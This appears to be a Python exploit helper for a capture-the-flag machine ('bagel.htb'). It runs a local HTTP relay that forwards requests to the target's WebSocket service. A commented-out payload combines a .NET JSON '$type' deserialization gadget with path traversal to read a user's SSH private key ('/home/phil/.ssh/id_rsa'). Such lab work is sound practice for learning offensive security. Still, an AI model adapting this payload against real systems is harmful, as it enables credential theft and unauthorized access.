from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://bagel.htb:5000/"

def send_ws():
    ws = create_connection(ws_server) #, header=["Origin: http://localhost:8000"])
    # If the server returns a response on connect, use below line	
    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
    #print("resp after connecting: " + str(resp))

    # For our case, format the payload in JSON
    #message = unquote(payload)
    #data = '{"ReadOrder":b"\x2E\x2Forders.txt"}'
    #data = '{"RemoveOrder":{"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}'
    data = '{"ReadOrder":"orders.txt"}'
    print("sending: " + str(data))

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            #try:
            #    payload = urlparse(self.path).query.split('=',1)[1]
            #except IndexError:
            #    payload = False

            #if payload:
            content = send_ws()
            print("response is: " + str(content))
            #else:
            #    content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass

